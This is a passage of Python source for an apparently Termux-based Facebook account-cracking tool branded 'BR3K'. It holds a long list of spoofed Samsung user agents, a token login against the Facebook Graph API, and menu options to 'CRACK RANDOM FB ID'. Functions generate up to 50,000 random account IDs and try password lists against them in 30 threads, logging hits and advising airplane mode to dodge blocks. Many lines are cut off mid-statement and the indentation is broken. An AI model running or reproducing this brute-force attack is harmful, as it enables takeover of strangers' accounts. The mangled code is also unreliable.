SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810Y Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J600FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9.0.0; en-au; SAMSUNG SM-GT9001 Build/R18NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36']

# INDICATION

id,id2,loop,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,[],[],[],[],[],[],[],[]

cp = 0

ok = []

try:

	os.mkdir('/sdcard/')

except:pass

# COLORS

x = '\33[m' 

k = '\033[93m' 

h = '\x1b[1;92m' 

hh = '\033[32m' 

u = '\033[95m' 

K = '\033[95m' 

kk = '\033[33m' 

b = '\33[1;96m' 

p = '\x1b[0;34m' 

# Converter 

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}

dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}

tgl = datetime.datetime.now().day

bln = dic[(str(datetime.datetime.now().month))]

thn = datetime.datetime.now().year

okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

# CLEAR

def clear():

	os.system('clear')

# BACK

def back():

	login()

 

Mrdevil="-MRD"

imt="-brand=="

ak="-pro"

myid=uuid.uuid4().hex[:10].upper()

try:

	key1 = open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'r').read()

except:

	kok=open('/data/data/com.termux/files/usr/bin/.MRD-cov', 'w')

	kok.write(myid+imt)

	kok.close()

def login():

	try:

		token = open('.token.txt','r').read()

		tokenku.append(token)

		try:

			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])

			public_menu()

		except KeyError:

			Public()

		except requests.exceptions.ConnectionError:

			clear()

			print(logo)

			print ( ' [×] Connection Timeout')

			exit()

	except IOError:

		Public()

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)


                print ("""
'########::'########:::'#######::'##:::'##:
 ##.... ##: ##.... ##:'##.... ##: ##::'##::
 ##:::: ##: ##:::: ##:..::::: ##: ##:'##:::
 ########:: ########:::'#######:: #####::::
 ##.... ##: ##.. ##::::...... ##: ##. ##:::
 ##:::: ##: ##::. ##::'##:::: ##: ##:. ##::
 ########:: ##:::. ##:. #######:: ##::. ##:
........:::..:::::..:::.......:::..::::..::


\033[41m\033[1;37m[BR3K]   [OMAR]   [ZEYAD ALABANY]   [YOUR-NEXT-PAPA]\x1b[0m
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : Omar and ALTARHONY√ \033[1;32m[BR3K]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m BR5K \x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  0926297375       │
\033[1;36m│ [✓] POWER  : \x1b[1;32m GRETZ TO MY BROTHER OMAR \x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘
""")
                print("%s [%s•%s] %sTOOL NAME : %sBR3K❌ ZXO ❌"%(G,R,G,B,G))
                print("%s [%s•%s] %sVERSION   : %s2.0"%(G,R,G,B,G))
                print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
                print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat))
                print("")
                #print("%s [%s1%s]%s CRACK RANDOM FB ID 2012-15 %s(PRO)"%(R,G,R,Y,G))
                #print("%s [%s2%s]%s CRACK RANDOM FB ID 2011-13 %s(PRO)"%(R,G,R,Y,G))
                #print("%s [%s3%s]%s CRACK RANDOM FB ID 2008-11 %s(PRO)"%(R,G,R,Y,G))
                print(G+"[1] CRACK RANDOM FB ID 2008    (PRO)")
                print(G+"[2] CRACK RANDOM FB ID 2007 %s(PRO) V1")
                print(G+"[3]CRACK RANDOM FB ID 2006 %s(PRO) V2")
                print(G+"[4]CRACK RANDOM FB ID 2005 %s(PRO) V3")
                print(G+"[5] ZEYAD ALABANY TELE AND FACEBOOK")
                print(G+"[6] OMAR FACEBOOK ACCOUNT")
                print(GET)
                hoga = input("\n%s [?] CHOICE : "%(B))
                if hoga in ["", " "]:
                        Main()
                #elif hoga in ["1", "01"]:
                #       if basesplit in plr:
                #               self.old_11()
                #       else:
                #               notice()
                #               exit()
                #elif hoga in ["2", "02"]:
                #       if basesplit in plr:
                #               self.old_11()
                #       else:
                #               notice()
                #               exit()
                #elif hoga in ["3", "03"]:#elif hoga in ["3", "03"]:
                #       if basesplit in plr:
                #               self.shanto9()
                #       else:
                #               notice()
                #               exit()
                elif hoga in ["1", "01"]:
                        if basesplit in plr:
                                self.oldcrack()
                        else:
                                notice()
                                exit()
                                elif hoga in ["02", "2"]:
                        if basesplit in plr:
                                self.old4_7()
                        else:
                                notice()
                                exit()
                elif hoga in ["3", "03"]:
                        if basesplit in plr:
                                self.old4_6()
                        else:
                                notice()
                                exit()
                                elif hoga in ["4", "04"]:
                        if basesplit in plr:
                                self.old4_5()
                        else:
                                notice()
                                exit()
                elif hoga in ["5", "05"]:
                        massg()

                elif hoga in ["06", "06"]:
                        omar()

                        ##      if basesplit in plr:
                #               self.oldcrack()
                #       else:
                #               notice()
                #               exit()
                #elif hoga in ["P", "p"]:
                #       notice()
                #       exit()
                #else:
                #       Main()
                
                 def shanto9(self):
                x = 111111111
                xx = 999999999
                idx = "100000"
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): >
                if (limit)>50000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))
                                print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
                                listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                      coeg.submit(self.api, user, listpass.split(",>
                        exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                except Exception as e:exit(str(e))

        def shanto4(self):
                x = 1111111
                xx = 9999999
                #idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): >
                if (limit)>50000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                                _ = random.randint(x,xx)
                                __ = idx
                                self.id.append(__+str(_))
                        print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
                                listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                      print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
                                        coeg.submit(self.api, user, listpass.split(",>
                        exit("\n\n%s [#] CRACK COMPLETE..."%(G))
                except Exception as e:exit(str(e))


        def old4_7(self):
